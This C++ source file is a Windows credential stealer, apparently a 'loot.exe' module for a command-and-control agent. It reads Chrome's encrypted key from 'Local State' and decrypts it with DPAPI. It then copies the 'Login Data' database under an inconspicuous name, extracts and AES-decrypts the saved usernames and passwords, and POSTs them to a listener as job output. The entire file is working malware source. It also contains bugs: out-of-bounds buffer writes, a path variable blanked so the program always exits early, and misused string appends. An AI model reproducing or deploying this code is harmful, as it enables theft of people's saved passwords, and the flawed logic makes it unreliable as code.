#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include "sqlite3.h" //Source: https://www.sqlite.org/capi3ref.html
#include <stdio.h>
#include <string.h>
#include <tuple>
#include <vector>
#include "json.hpp" //Source: https://github.com/nlohmann/json
#include "aes_gcm.h"
#include "http.h"

#define SQLITE_DONE        101

struct ChromeData {
	std::string originURL;
	std::string actionURL;
	std::string username;
	std::string password;
};

std::tuple<std::string, std::string> getChromePaths() {
	// Get current user (for the filepath)
	// 256 is max username length (see lmcons.h)
	DWORD bufSize = 256 + 1;
	char* userBuf = (char*) malloc(bufSize);

	if (GetUserNameA(userBuf, &bufSize) == 0) {
		printf("[ERROR] Could not retrieve username.");
		free(userBuf);
		return {"", ""};
	}

	userBuf[bufSize] = '\0';
	// printf("%s\n", userBuf);

	// Get Local State filepath
	std::string lsFilePath = "C:\\Users\\";
	std::string userName = userBuf;
	std::string endPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

	lsFilePath.append(userName);
	lsFilePath.append(endPath);

	// printf("%s\n", filePath.c_str());

	// Get SQLite Chrome database path
	std::string dataFilePath = "C:\\Users\\";
	std::string endPath2 = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";

	dataFilePath.append(userName);
	dataFilePath.append(endPath2);

	free(userBuf);

	return {lsFilePath, dataFilePath};
}

std::string loadLocalState(std::string chromePath) {
	// Get file handle with CreateFile (doesn't actually create a file, it just opens one)
	HANDLE fileHandle = CreateFileA(
		(LPCSTR) chromePath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING, //Only open if file exists, end process if file does not exist
		FILE_ATTRIBUTE_READONLY,
		NULL);

	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[INFO] No Google Chrome data.\n");
		return "";
	}

	DWORD chromeBufSize = 131072 + 1; // Arbitrary sized buffer, can adjust
	DWORD bytesRead;
	char* chromeContentsBuf = (char*) malloc(chromeBufSize);

	if (!ReadFile(
			fileHandle,
			chromeContentsBuf,
			chromeBufSize,
			&bytesRead,
			NULL)) {
		printf("[ERROR] File could not be read.\n");
		// return "";
	}

	chromeContentsBuf[chromeBufSize] = '\0';

	// Close file handle
	CloseHandle(fileHandle);

	return chromeContentsBuf;
}

std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    std::vector<BYTE> output;

    DWORD confirmSize;

    BOOL bufsizeCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	NULL,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufsizeCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Obtaining the correct size for the buffer failed." << std::endl;
    	return output; //Return empty output
    }

    BYTE* buf = (BYTE*) malloc(confirmSize);

    BOOL bufCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	buf,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Could not copy data." << std::endl;
    	free(buf);
    	return output; //Return empty output
    }

    // printf("buf:\n");
    // printf("%s\n", buf);

    //Fill output using buf
    std::vector<BYTE> out(buf, buf + confirmSize);
    output = out;

    free(buf);

    return output;
}

BYTE* decryptDPAPI(std::string decodedKey) {
	
	// Create key BLOB
	DWORD keyLen = decodedKey.length();
	BYTE keyArr[keyLen];
    std::memcpy(keyArr, decodedKey.data(), keyLen);

	CRYPT_INTEGER_BLOB keyBlob;
	keyBlob.cbData = keyLen;
	keyBlob.pbData = keyArr;

	// Create entropy BLOB
	BYTE* entropyArr = NULL;

	CRYPT_INTEGER_BLOB entropyBlob;
	entropyBlob.cbData = 0;
	entropyBlob.pbData = entropyArr;

	// Init result, unprotect data
	CRYPT_INTEGER_BLOB resultBlob;

	if (!CryptUnprotectData(
			&keyBlob,
			NULL,
			&entropyBlob,
			NULL,
			NULL,
			0,
			&resultBlob
		)) {
		printf("[ERROR] DPAPI decryption failed.\n");
		LocalFree(resultBlob.pbData);
		LocalFree(entropyBlob.pbData);
		return NULL;
	}

	// Obtain data, free BLOB data
	BYTE* resultBuf = (BYTE*) malloc(resultBlob.cbData); // +1?
	std::memcpy(resultBuf, resultBlob.pbData, resultBlob.cbData);

	LocalFree(resultBlob.pbData);
	LocalFree(entropyBlob.pbData);

	return resultBuf;
}

BYTE* getAESKey(std::string chromePath) {

	// Get file "Local State" contents
	std::string localStateContents = loadLocalState(chromePath);
	//printf("localStateContents: %s\n", localStateContents.c_str());

	// Parse as JSON
	auto localStateJSON = nlohmann::json::parse(localStateContents.c_str());

	// Get base64 encrypted key
	std::string b64Key = localStateJSON["os_crypt"]["encrypted_key"];

	// Decode using base64
	auto decodedKey = b64Decode(b64Key.c_str());

	// Ignore magic bytes and return
	std::string keyOut(decodedKey.begin() + 5, decodedKey.end());

	return decryptDPAPI(keyOut);
}

std::string copyChromeData(std::string databasePath) {
	//Retrieve username
	DWORD bufSize = 256 + 1;
	char* userBuf = (char*) malloc(bufSize);

	if (GetUserNameA(userBuf, &bufSize) == 0) {
		printf("[ERROR] Could not retrieve username.");
		free(userBuf);
		return 0;
	}

	//Make copy, use inconspicous name
	std::string copiedPath = "C:\\Users\\";
	std::string userName = userBuf;
	std::string endPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\LoginDataOld.db";

	copiedPath.append(userName);
	copiedPath.append(endPath);

	// FALSE to override other copies
	if (CopyFile(
			(LPCSTR) databasePath.c_str(),
			(LPCSTR) copiedPath.c_str(),
			FALSE) == 0) {
		free(userBuf);
		return "\0";
	}

	free(userBuf);

	// Used for debugging
	// std::string testPath = "C:\\Users\\";
	// testPath.append(userName);
	// std::string endTestPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\LoginDataTEST.db";
	// testPath.append(endTestPath);
	// return testPath;

	return copiedPath;
}

std::vector<ChromeData> stealData(BYTE* key, std::string databaseFilePath) {
	// Access database
	std::vector<ChromeData> out;
	sqlite3* db;

	int check = sqlite3_open(databaseFilePath.c_str(), &db);
	if (check) {
		printf("[ERROR] Could not open LoginDataOld.db\n");
		sqlite3_close(db);
		return out;
	}

	// Execute SQLite
	std::string cmd = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
	sqlite3_stmt* statement; 

	int execCheck = sqlite3_prepare_v2(db, cmd.c_str(), -1, &statement, NULL);
	if (execCheck) {
		printf("[ERROR] Could not execute SQLite command\n");
		sqlite3_close(db);
		return out;
	}

	ChromeData dataOut; //Custom struct at top of file

	// Create AES object, used to decrypt passwords
	auto aes_obj = new AESGCM(key);

	while ((execCheck = sqlite3_step(statement)) != SQLITE_DONE) {
        std::string origin_url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 0)));
        std::string action_url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 1)));
        std::string username = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 2)));
        // TODO: Just need AES on this password
        std::string password = std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, 3)));

        BYTE passwordBytes[password.length()];
    	std::memcpy(passwordBytes, password.data(), password.length());

    	// Decrypt with AES-GCM
    	// TODO: Might need debugging
        aes_obj->Decrypt(NULL, 0, passwordBytes, sizeof(passwordBytes), NULL, 0);

        int bufSize = 256; //Arbitrary size for password, can be modified
        char* passBuf = (char*) malloc(bufSize + 1);
        std::memcpy(passBuf, &aes_obj->plaintext, bufSize + 1);
        passBuf[bufSize + 1] = '\0';

        dataOut.originURL = origin_url;
        dataOut.actionURL = action_url;
        dataOut.username = username;
        dataOut.password = std::string(passBuf);

        out.push_back(dataOut);
    }

    sqlite3_finalize(statement);
	sqlite3_close(db);

	aes_obj->Cleanup();

	return out;
}

int main(int argc, char* argv[]) {
	std::string outData = "";
	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
	// "Local State" is the file

	// Get Local State and SQLite Chrome database filepaths as a tuple
	auto [chromePath, databasePath] = getChromePaths();
	//printf("chromePath: %s\n", chromePath.c_str());

	chromePath = "";
	if (chromePath == "" || databasePath == "") {
		//printf("[ERROR] Could not obtain filepaths\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not obtain filepaths\'}";
		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}

	// Get AES key
	BYTE* key = getAESKey(chromePath);
	//printf("Key: %s\n", key);

	// SQLite Chrome database path
	//printf("databasePath: %s\n", databasePath.c_str());

	// Copy ChromeData.db to hidden directory (can adjust later)
	std::string databaseFilePath = copyChromeData(databasePath);
	if (databaseFilePath == "\0") {
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'ERROR\', \'output\': \'[ERROR] Could not copy LoginDataOld.db\'}";
		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}

	// Connect to the databse and steal data
	std::vector<ChromeData> theGoods = stealData(key, databaseFilePath);
	if (theGoods.empty()) {
		printf("[INFO] No data to steal\n");
		outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'SUCCESS\', \'output\': \'[INFO] No data to steal\'}";
		makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);
		return 0;
	}

	// Return results
	// printf("[INFO] Google Chrome data loaded!:\n");
	std::string msg;
	msg.append("[INFO] Google Chrome data loaded!:\n============\n");
	//printf("============\n");
	for (int i = 0; i < theGoods.size(); i++) {
		// printf("originURL: %s\n", theGoods.at(i).originURL.c_str());
		// printf("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
		// printf("username: %s\n", theGoods.at(i).username.c_str());
		// printf("password: %s\n", theGoods.at(i).password.c_str());
		// printf("============\n");
		msg.append("originURL: %s\n", theGoods.at(i).originURL.c_str());
		msg.append("actionURL: %s\n", theGoods.at(i).actionURL.c_str());
		msg.append("username: %s\n", theGoods.at(i).username.c_str());
		msg.append("password: %s\n============\n", theGoods.at(i).password.c_str());
	}

	outData = "{\'job_id\': \'0\', \'agent_id\': \'0\', \'command\': \'loot.exe\', \'status\': \'SUCCESS\', \'output\': \'";
	outData.append(msg);
	outData.append("\'}");
	printf("[INFO] RESULT: %s\n", msg.c_str());
	makeHttpRequestPOST("127.0.0.1", 5000, "/output", 0, outData);

	free(key);

	return 0;

	//Notes:

	// getChromeContents(): get contents of JSON file "Local State"

	// JSON file with secret key, encrypted with data protection api (DPAPI)
	// To decrypt:
	// Parse encrypted (symmetric) key
	// Decrypt with DPAPI
	// Decrypt data in SQLite database
}